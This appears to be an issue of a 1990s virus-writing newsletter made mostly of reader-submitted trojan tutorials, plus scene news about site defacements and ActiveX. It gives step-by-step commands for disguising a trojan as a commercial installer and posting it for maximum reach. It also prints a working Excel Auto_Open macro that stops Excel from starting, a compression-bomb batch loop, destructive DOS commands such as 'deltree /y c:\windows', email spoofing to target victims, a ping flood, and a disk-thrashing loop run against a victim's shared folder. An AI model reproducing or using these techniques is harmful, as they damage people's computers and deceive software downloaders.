Introduction

	Yeah...  It's been a little while since I have been able to crank out
an issue of the Virus Heaven Newsletter.  Those who have been e-mailing me
asking when the next issue would be out, know that the date has been
continually falling further and further behind. 
	The backlog started when I threw out some articles for Virus Bits &
Bytes magazine issue #4, and then continued through some upgrades on my
system as well as an increasingly larger amount of time I am having to
spend at work nowadays.
	Since the First issue, I have been getting all kinds of submissions
for the newsletter.  Some have been used in Virus Bits & Bytes Magazine #4,
others have been held for this somewhat special issue of the newsletter.
	These are articles I was reluctant to publish due to the fact that
they dont really deal with viruses, but more the ilk of Trojans and other
forms of Malware.  But due to the nature of the computer virus, I have
decided that these things belong on thier own shelf, and will thus have
thier own Issue, for the most part.
	Most of this newsletter is reader's submissions.  If they want to be
contacted, they will have left an e-mail address in thier submission.

	Anyhow, Enjoy the issue, and I will keep you posted about the next
full scale issue to be released!

SECTION - 2

			How to Hide Your Virus/Trojan (Revisited)
			=========================================
			by Virulent (mdabrowski@juno.com)

*WARNING* This article contains info that might be offensive to some. May
I remind the reader, that in the United States, Canada, and the UK, virus
creation is not a crime. Frankly, it's legal everywhere except for Sweden
and Switzerland. The author disclaims any responsibility, blah, blah,
blah. 
	The author, however interested, doesn't condone the creation of
destructive viruses. He hates them himself. If you're gonna do it, he 
does condone amusing viruses or ones with nifty visual displays.

*NOTES* Let it be known that I consider myself an AVer, as well as a
VXer. Any AVer that's not in the least bit way an VXer is just an AV 
wannabe. Any VXer that isn't a tad bit an AVer is an idiot. If you're 
around viruses as long as you might be, you're bound for infection. I have,
and I have been toasted by such wonderful creations as Natas. I have no ill
will against either community, and I love being a part of them both. If this 
article angers anyone in the AV community, that's their problem. I believe 
I'm making and will make lots of contributions to the field. Bug off.

	I'd also like it to be known that, for one reason alone, I have
personal contempt for George Wenzel. I almost like most people in the AV
community. I have no ill will towards the moderator of alt.comp.virus.
Without him, alt.comp.virus would be flooded with make-money-fast posts and
such. Kudos.
	My one reason for hating Mr. Wenzel is the fact that he likes to 
complain about VXers to their ISPs. This is a mean and contemptuous practice
that must be stopped. No one should be "afraid" to post whatever they want 
on the Net. If you've been "harassed" by Mr. Wenzel at any point, contact me.
I'd like to hear about it. And that's the only reason I dislike the man. I
think he does a fine job on producing the comp.virus mini-faq.

	This has been my two-cent editorial on myself and those around
me. Read it and weep, compadre.

Necessary Software:
NUTILS20.ZIP  - The Nowhere Utilities
		    Available everywhere. They're a must have for any power 
		    user, not just those into viruses.
STEGANOS.ZIP  - Steganos
		    Available in many places, or by contacting me.
		    It hides any file into a graphic, sound, or ASCII file.
		    Also will support new file types, if necessary.
=========================================
	An article in CPI Newsletter Issue 2 starts, "So you've made the 
most k-rad virus in the history of the world. So what do you do with the
damn thing?" This topic has been revisited by me, only because I've found
new techniques that must be told. I'll also go over many older
techniques, for the sake of completeness. For my ideas, the two pieces 
of software above are necessary. I use both of them everyday, not just for 
my viral needs.

I. The Basics
=============

	Okay, here goes. The most basic way to hide a piece of viral
software is to simply infect any old piece of shareware and upload it to
a BBS or post it to a newsgroup. This is pretty pointless, especially for
viruses that are not encrypted in any way or just don't work. They also
get pointed out quickly, and you get flamed. Or George Wenzel gets your
account canceled, whatever floats your boat. You should feel like a
moron.

II. PKLITE Files - More Virus, Less Byte
========================================

	Doing! A light goes on in your head. You decide to PKLITE the
file, remove the header, and then upload/post it. This may fool some 
scanners, but the good ones may still catch it. 

	PKLITE reduces the size of a file. Viruses increase the size. If,
in the end, the PKLITEd infected file is smaller than the original, use
RESIZE, one of The Nowhere Utilities. That was Tip #1. In the end, even
if the end user doesn't have a good scanner, he still may notice the file
has changed, if:
	
	1.) You haven't changed the size of the file in PACKING.LST or
	    what have you.
	2.) There's no authentication on the ZIP file. This is especially
	    so for software from big name companies.
	3.) The time/date stamp reads 1:05 a.m., Yesterday morning when 
	    the rest of the files read 3:15. p.m., July 9th, 1994.

	There are utilities around to solve these problems. Windows
Notepad will solve #1. A program - I can't remember the name - distributed 
with an issue of 40Hex might solve #2. FIXTIME (A Nowhere Utility) will 
solve #3.

	Voila! The end user is completely fooled. Even though you may be 
miles away, you can hear him/her swearing as his CMOS is wiped out, or
whatever. 

	You go into school the next day, and you get a note from a
friend. He needs a copy of ZeroBug.52086GFgbf?64, a new virus of which you 
have one of the 4 copies in the world. George Wenzel got your friend's 
account canceled, so he can't get it via e-mail. You decide to only way to 
get it to him is through the school's BBS.

III. Getting that file to your Vx buddy
=======================================

	It turns out the teacher running the BBS is a paranoid little
jerk that not only has 19 virus scanners scanning each upload, but personally
inspects each file for usual stuff. And they pay him for this! Since the
guy checks everything out, using the PKLITE technique ain't gonna help
you. Luckily, you and your friend picked up a copy of STEGANOS, either
from that brilliant article author, Virulent, or of some site on the Net.

	You decide to hide Zerobug in a picture of your personal hero,
Bill Gates, or maybe that F-Prot wallpaper BMP Datafellows distributes.
STEGANOS is simply to use. The syntax is as such:

STEGANOS <e/d> <graphic/sound/ascii file> <file to hide> <password> </b>
</d>

E or D means encode or decode
/B means keep a backup of the original graphic file
/D means to delete the file you've just hidden.

	It's pretty simple. So the jerk at school looks at your BMP of
Chairman Bill, and just sees some pixels with strange colors. "Hmm. Must
of had errors in the transfer." Your friend downloads the BMP and now
has a copy of the now infamous Zerobug variant. (BTW, Zerobug is a neat
virus, especially when you deliberately infect yourself to see the nifty
effect. :) )

IV. Can You Go Over That Again?
===============================
	
	You may want to know EXACTLY how to do what I said in Section II,
so I'll go over the command-by-command play of me replacing a copy of
SoftRam, a Windows memory manager, with a trojan horse.

	It turns out that the thing I've selected to replace SoftRam with
is a trojan, so I can't just infect the installation file. The setup's a
Windows program anyway, so it'll be futile. I'll have to replace SETUP.EXE 
with the trojan. The trojan's name is Hemoroids, which I got off God@rky's 
web site. Here's a DIR of the original files in the zip:

README   WRI     20480 05-08-95  12:00p
SETUP    EXE    273920 05-08-95  12:00p
SETUP    INS     21085 05-08-95  12:00p
SETUP    LGO       391 05-08-95  12:00p
SETUP    PKG       193 05-08-95  12:00p
SRAM     Z       95294 05-08-95  12:00p
SRAMRES  DLL     15040 05-08-95  12:00p
~INS0763 LIB      7190 05-08-95  12:00p
IMORTAL1 ASC      1448 07-01-96   7:15p
HEMOROID EXE	  2448 06-20-96  10:32p

	IMORTAL1.ASC would be an ad for the BBS I downloaded it from,
which would be The Isles of the Immortals. (203-266-6079 8N1)

	I'd then take HEMOROID.EXE, which is 2448 bytes. Due to the
271,472 byte difference between HEMOROID.EXE and SETUP.EXE, I can't just
rename HEMOROID.EXE. There's also the year time/date difference. So I'll
first RESIZE (A Nowhere Util) HEMOROID to the size of SETUP:

RESIZE -R 273920 HEMOROID.EXE

	-R is so that the 270,000 some odd bytes put into HEMOROID aren't
all zeros, or it'll compress to around 5k. HEMOROID and SETUP are now the
same size. Now the time/date stamp:

FIXTIME 05-08-95 12:00 HEMOROID.EXE

	The directory listing should look like this now:

README   WRI     20480 05-08-95  12:00p
SETUP    EXE    273920 05-08-95  12:00p
SETUP    INS     21085 05-08-95  12:00p
SETUP    LGO       391 05-08-95  12:00p
SETUP    PKG       193 05-08-95  12:00p
SRAM     Z       95294 05-08-95  12:00p
SRAMRES  DLL     15040 05-08-95  12:00p
~INS0763 LIB      7190 05-08-95  12:00p
IMORTAL1 ASC      1448 07-01-96   7:15p
HEMOROID EXE    273920 05-08-95  12:00p

	Good. Now you can rename HEMOROID to SETUP. But the dang project
isn't done yet. We need to PKZIP it up! Here's the two zip files. 
SOFTRAM.ZIP is the original. SOFTRAMI.ZIP is the infected one. I've also
fixed the time/date stamp on SOFTRAMI.ZIP. The reason the ZIP's time/date
stamp is so new, is that, since I downloaded it from a BBS, a ZIP comment
was added, changing the date.

SOFTRAMI ZIP    394813 09-09-96   9:50p
IMORTAL1 ASC      1448 07-01-96   7:15p
SOFTRAM  ZIP    371552 09-09-96   9:50p

	IMORTAL1.ASC is our BBS comment file. Since the ZIPs aren't
relatively exact until we add the comment, I'll do it:

PKZIP -Z SOFTRAMI.ZIP < IMORTAL1.ASC

	And I'll fix the time/date stamp again. Now SOFTRAMI.ZIP could 
effectively pass as the original. And there's only a 23,261 byte size
difference. And no one usually runs FC (file compare) on two ZIPs like
that. Now you'd upload SOFTRAMI.ZIP (after renaming it and such) to your
favorite BBS, or post it to your favorite binaries newsgroup.

	I never actually had SoftRam. It's a commercial program, so I had
someone who did have it send me a DIR of the files to work with. I
wouldn't use SoftRam as a trojan myself, considering there's more non-warez 
newsgroups and BBSes then there are warez ones, and we're going for 
maximum reach with the same file, eh?

V. Conclusion
=============

	I've gone over a lot of techniques and such with you today, and I
hope you use them well. As always, I take no responsibility. I hope this
article sort of raises my standing in the Vx community, while not
lowering it in the Av community. If you have any thing to add to this 
article, please e-mail me. If you have a flame, and are on a Unix-type 
system, type it into a text file and move it to /dev/null.

	In the future, I intend to write more articles and to possibly
come out with my own virus scanner to take out any virus on the WildList
or whatever. I hope to eventually even be one of the participants. If 
you'd like to join me on any of my yet-to-be-infamous exploits, my e-mail
address is at the top of this article. Thanks, Virulent.

SECTION - 3
			MS-Excel Macro - Shutdown Trojan

The "shutdown.xls" is a trojan that although nondestructive is
sure to piss off and confuse the average Excel user.  It contains an 
Auto_Open macro which creates an ".xla" add-in file in the person's Excel 
startup directory entitled "msexcel.xls" (sounds pretty innocent, kinda like
something you certainly wouldn't want to delete).  The sole purpose of this 
file is to close Excel. The first time you open shutdown.xls, it creates this
xla file then dissappears then shuts Excel off. Every time you try to open 
Excel in the future, it starts to fire up then automatically opens the xla 
file in the startup directory then shuts down.  Until you delete the 
msexcel.xls file in your startup directory, you will be unable to open Excel.
The beauty of an xla file is that you can't open it to see the contents.  
Noone is going to want to delete something that the can't look at first 
especially with a name lke msexcel.xls.  If you want to create this yourself,
the source code to the macro is below.  I have tested it using Excel 5 for 
Win3.1 and Excel for Win95.

Sub Auto_Open()
    Application.DisplayAlerts = False
    Dim Start As String
    Start = Application.StartupPath
    ChDir Start
    ExecuteExcel4Macro "VBA.MAKE.ADDIN(""msexcel.xla"")"
    Application.Quit
End Sub

That's it! Just name the file "msexcel.xls" and you are done!

    An Introduction to basic computer anarchy and the techniques involved

Why am I writing this?

I'm writing this due to the fact that I'm always being asked to help people 
who want to learn how to hack or how to create mayhem on other people's 
computers and I'm sick of repeating myself.

I personally will accept no responsibility for any of the methods I describe
creating damage on someone else's computer. If you're gonna do it, take the 
rap for it yerself!

I'll try to outline some methods you can use to really give people a hard 
time if you feel fit.

Contents:
The Worm (and how to create a simple one using common ingredients found 
	   around the home)
Tricks using DOS 
FakeMail
Networking Havoc

That's about all for this first tutorial, if you want more just drop me a 
line or give God@arky a shout and he'll pass it on.

1. The Worm
What is a worm?

A worm is a piece of code that basicaly replicates itself locally (not to 
be confused with a virus...the worm does not transfer from host to host, 
it just fucks up the computer it's run on)

For example a file that just gets bigger and bigger until you got no more
space left on your HDD. Sounds funky? it's dead easy to write and it's 
spectacular when it goes off! 

Imagine a 50k exe file that when it's run suddenly changes to 200MB and if
you aint got 200MB free on your HDD you got big problems!

Try this (i've already done so and it works fine and dandy)
I've left out important bits, but once you get the idea it shouldn't be 
hard to suss out how to make it even worse.

Create a text file using edit (I usually create a file that's full of spaces
with the words "This space left intentionally blank" in the middle of the 
page) and press enter until it's quite large. Hilight the lot and copy and 
paste the text a few times until you have quite a large txt file then save 
it.

Next write a batch file (called 1.bat or something like that) that copies 
your txt file onto itself and keeps looping.

example:

:loop
copy stuff.txt stuff2.txt
copy stuff.txt+stuff2.txt stuff.txt
dir stuff.txt
goto loop

now run the bat file and watch it grow.....within a few minutes you've got a
HUGE txt file that basically says 'this space left intentionally blank'

When you've got a file sufficiently large enough (ie you've run out of disk 
space!) you've got the fun bit......

Enter the PK family....

OK, right, now just point PKZIP at it and you'll see the txt file compress 
to around 100k (depending on the compression type you use.....I've actually 
had it to about 50k!)

Now you have a 100K zip file comtaining a 200MB txt file.....

Right, now run ZIP2EXE on it and turn it into an exe file et voila! instant 
bomb!

You can adda few little extras here. There's a program in the nowhere 
utilities that's a file padder. Run that and point it at your exe file to 
make it exactly the same as a known file on the victim's computer. Then 
plant it and sit back and watch the fireworks.

Another way of getting the victim to run the bomb is to get a copy of QBASIC
4.5 or VB and write a little program that looks like an installer, but 
instead of installing it's doing damage. I got a guy with this and he was 
running the installer for 20 mins. After he got bored of waiting he rebooted
only to find that his HDD was full of a HUGE txt file (he had a 1GB HDD) and
wouldn't boot 'cos the boot sector had been corrupted.

The hardest thing with a worm is actually getting the victim to run it. If 
you use one of the ways I described it should make it a lot easier to dupe 
your victim into committing HD Murder.

2. Tricks using DOS
Yeah yeah yeah I knwo what you're saying 'we use windows, why use dos?'. 
Basically you can do a hellova lot more with a CLI than you can with a GUI 
(at least at the moment you can) and it's easier to work with (as far as I'm
concerned!)

Some undocumented stuff to do in DOS (some of it good some of it not)
ONLY TRY THESE IF YOU WANT TO AND DON'T EVEN THINK ABOUT BLAMING ME IF YOU 
FUCK UP YOUR COMPUTER!

Echo 123>clock$

This is a funky little command that overwrites your internal dos variable 
clock$ and crashes your computer with a stack overflow. After rebooting you
will notice that your bios has been corrupted and depending on your bios, 
all your settings have been filled with shit. Some BIOS's only get the date
and time corrupted, but some actually completely reset themselves (not nice
if your bios doesn't have a HD autodetect!)

There are all sorts of internal variables that you can overwrite with the 
echo command. To get a list of these type mem/debug/p and see what you can 
play with BUT BE CAREFUL!


the eternally famous deltree /y c:\windows
just deletes your windows directory without prompting for confirmation. 
This also works with format too.


Attrib c:\command.com +h +s +r

means that you'll have to boot from floppy until you unhide command.com.

A handy thing to do (but you need a little time in private) is to run 
PCTOOLS or norton hex editor and change the boot sector info on your or 
your victim's HDD from NON bootable disk blah blah blah to "This disk has 
been infected by the Good-Times Virus" then every time you format a floppy 
from your computer the boot sectors of the disks you format wil have a 
message about the goodtimes virus if you try to boot from them!


3. FakeMail (or how to confuse the hell out of lamers)
This is also very handy for stopping unwanted spam coming in by spammers 
stealing your email address from the newsgroups.

In Netscape select Options, then Mail and News Preferences, then Identity 
and change your return email address to whatever you want (I have been known
to make it the same email address as the vitim you want to hit with the 
fakemail so when he replies he just spams himself!)

NOTE: This takes effect on the NEXT email you send, so if you've already 
selected to send an email and then change your return address and identity 
it will not take effect on that email. 

BE AWARE OF THIS AS IT CAN GET YOU IN SOME SHIT IF YOU SEND OBNOXIOUS MAILS
THINKING YOU'VE REMOVED ALL TRACE OF YOUR IDENTITY.

Also, be aware of the fact that this is not untraceable, the only way of 
sending untraceable email is either by using the port25 option in UNIX or 
using an anonymous remailer (even then the remailer has an obligation to 
give your details to the authorities if requested to do so in some 
countries)


4. Networking Havoc
If you have a network in your office or school you can create all sorts of 
mayhem. Here a few ways to do so.

Ping!
If your net transport is tcpip you can realy bring the network speed down by
ping flooding everyone. Find out the ip address of your victim(s) and then 
just ping them continually from a bat file.

ie..

:loop
ping 127.0.0.1 (or the ip address of the victims terminal)
goto loop

and then run the batch file in the background.
In windows95/NT if you have tcpip networking you have ping in your windows
directory as well as a few other things like telnet, and tracert.

SwapFile Havoc!
If the victim on the network has a shared directory (ie to play network
doom etc..) you can really play hell with their computer.

Map the victim's directory
Create a new directory on the victims shared directory.
create a bat file on your computer like this. (I'll use doom as an example)

:loop
copy x:\doom.wad x:\new\doom.wad
del x:\doom.wad
copy x:\new\doom.wad x:\doom.wad
del x:\new\doom.wad
goto loop

Basically, this copies the doom.wad backwards and forwards between the 
original directory and the new directory. Bearing in mind that the doom.wad
is about 15MB and is deleted when copied, the victim just sees his hard 
drive going ballistic and all his processes slow down to a crawl because 
he's having to share hard drive access between his swapfile and a remote 
process (which doesn't affect the speed of your terminal!)

I did this to a victim and he ended up reformatting his HD because his 
computer was running like a pig and hammering his HD all the time.

Another advantage of running stuff like this from a remote terminal is that
if you are about to be discovered, you can always swithc off the process.


Well, that's it for now. If you liked this, thanks. If you didn't, why did 
you bother downloading it in the first place!

If you want more, let me know.

                  	  Site News & Info
                             By God@rky

	Well there has been quite a bit of things going on in the VX world. 
Perhaps I will remember it all, perhaps not.  

	One of the biggest additions to the Vx world recently was the
appearance of the West Coast Institute Of Virus Research (www.wcivr.com).
There has been much talk about this site, and I can see why.  The site is 
maintained by Falcon, and contains a very vast collection of Viruses.
	In the newsgroup alt.comp.virus, there has been some squabbling over
wether or not the AV programs mentioned on the site detect the viruses or not.
Many of the viruses there are indeed detected.  And I believe there will be 
quite a few there that aren't currently detected.  I personally don't have 
the time to test my own site and collection, let alone Falcon's.  And really,
what is it with the interest it has stirred up anyway of the AV folks.  Since
when did they start caring whether claims a Vx site makes are true or not, or
for that matter backed by science?  Get real.  Anyways, the URL is;

			Virus Heaven Hacked?!?!  
                              By God@rky

	I guess as many of you may have seen,  The Virus Heaven Website was
hacked.  The only damage done was visual, and simply remedied by re-loading
the HTML onto the site.  Instead of the usual Anti-Censorship Garb that
appears on the graphics version of the site, the hacks left a "Microsoft
Nazis" logo there, and renamed the "40hex" zines to "40sex". As i said, it
was an uninspired easy hack, that was easily remedied. Then afterwords, I
was unable to access my E-mail or update the site.  I am not sure if this 
was do to Chaos changing my password (to prevent further hacks through my
account) and not informing me of the change, or if my account was hacked a
second time.  The total time I was unable to update the site or check my
mail was exactly ONE MONTH.  

	Also, as many of you noticed, a week or two after my site was hacked,
The Alliance Virus Group page was hacked as well.  The leftovers, at that 
point named "The Alliance Virus Football Page" with links to a S.I.N. site
and some other site that escapes memory now, and captioned at the bottom,
"Hacked By DaFool".

        During this time, I thought alot about the site I maintain, and the
Service/Disservice I provide the Internet Community.  At one point, I became
tired of the entire commotion that comes about when you make viruses
available over the Internet. The size of the withdrawl's from my
precious wallet of spare time that the site made were quite large.  I was
ready to end the site.

        It was voiced by many, that DaFool, and who else hacked the ILF
Server were doing a great disservice to the entire hacking community, as
the server will provide a home, hassle free for such sites.  Others stated
that it was probably a hack aimed at the Alliance for some kind of mental
masturbation in a "Hack-war" of some sorts.  But then again, who really gives
a fuck, huh? The hack apparently provided a service, as security was upped at
ILF.

        I have decided against shutting down the site for the time being.
I am not sure what made me change my mind to continue running the site...
Hell, who knows when it will change again. Many of the sites on ILF are now
gone.  One of the hard drives was cleared, so they will be re-appearing in a
matter of time.  But I thought it was important that I let you all know
why I wasn't responding to your mail or why the Virus Of the Month for
February were 2-3 months old.

                    The Browser Wars Become Uneven? Maybe...
                                By God@rky

(NOTE: This article's primary reason for appearing in this issue, is
because of the possibuility made for WWW trojans)

        We all have been witness to the battle between Microsoft and
Netscape.  The battlefield?  Primarily the WWW. The weapons?  All the
plug-in's and processor bogging features you can (or in some cases CAN'T)
handle.

        But a new weapon brought in by MicroSoft, may have backfired.
That weapon is known as ACTIVE-X.  I am not going to go into the specifics
of ACTIVE-X's flaws or security holes, there will be an URL at the end of
this article which will take you to a site that will tell you everything
you wanted to know about the problems with Internet Explorer and Active-X.

        Apparently Active-X makes it possible to run *ANY* program on the
client machine of the person who is viewing the page with the propper
Active-X malware scripted into it.  I suppose this means that a "harmless"
viewing of your favorite web site can trigger the FORMAT command, or even
a virus (Vx dropper).

        From everything I have read, this is not possible with Netscape (any
version). And from recent news, I guess Microsoft isn't planning on plugging
these security holes.  But then why would they.  They didn't make it any
harder to create Macro Viruses with Office 97 in either Excel or Word.  Now
that there are more than 400 Word Macro Viruses alone, and probably quite a
few more being made each day, there isn't much they can do.

        Here is the URL for the site that dives into the world of
Over-If-Not-Hyper-Active-X and Internet Explorer;

http://www.halcyon.com/mclain/ActiveX/

(Note: Not sure, as I don't use Internet Explorer, but I would recommend
using Netscape when you visit this site. <grin>)

        Well I just didn't think it would be right to do an issue without
some sort of virus info in it, so here we are.  Some of you are framiliar
with the King Lizard line of viruses (the Coconut family).  Well here are
dooMSday's careful analysis of the first two coconut viruses, COCONUT-OW!
and COCONUT-AP!

        And for those whom just cannot wait for more of the coconut family,
be sure to head on over to Virus Heaven for the newest addition to the
family, the COCONUT-2099 virus.  It is appending, non-resident w/ double
encryption, handler on int 24h, Antitracer, keyboard blocking, dot-dot
search and hooks int 3h.  It does not infect files exe files under 1k or
files over 500k.  It does not infect .COM files that have been renamed .EXE.
Un-offensive payload and is currently (March 5, 1997) undetectable by
commercial Virus scanners.

                                The End

        Well so brings another close to the Virus Heaven Newsletter.  I
expect that you guys will leave me alone for a week or two before hounding
me about when issue #4 will be out.  I will admit this one took awhile to
get out, hell I have been working on it since before Christmas.  But
I have a few ideas for articles.  I may even be doing some research on
this next one, but that is all I will say for now. And of course, as always,
if you write an article send it in.  I do have one request though,
Please don't send me anymore TROJAN handbooks and tutorials.  This was it,
I wanna at least keep this thing as focused as a passed out drunkard on the
curb.
